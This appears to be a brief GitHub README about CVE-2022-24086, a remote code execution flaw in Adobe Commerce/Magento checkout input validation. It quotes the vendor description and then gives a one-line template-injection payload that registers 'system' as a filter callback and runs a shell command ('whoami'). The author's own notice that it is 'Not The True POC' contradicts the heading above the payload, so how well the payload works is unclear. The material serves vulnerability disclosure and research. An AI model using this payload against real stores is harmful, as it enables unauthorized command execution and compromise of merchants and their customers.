# CVE-2022-24086
CVE-2022-24086 about Magento RCE 

## Description
Adobe Commerce versions 2.4.3-p1 (and earlier) and 2.3.7-p2 (and earlier) are affected by an improper input validation vulnerability during the checkout process. Exploitation of this issue does not require user interaction and could result in arbitrary code execution.

## POC

> Notice: This Not The True POC ...

![image](https://user-images.githubusercontent.com/18260135/155713791-49aa3cfd-d1a0-4f54-8de9-5a22eb1bf93c.png)

> POC

```{{var this.getTemplateFilter().addAfterFilterCallback("system").filter("whoami")}}```
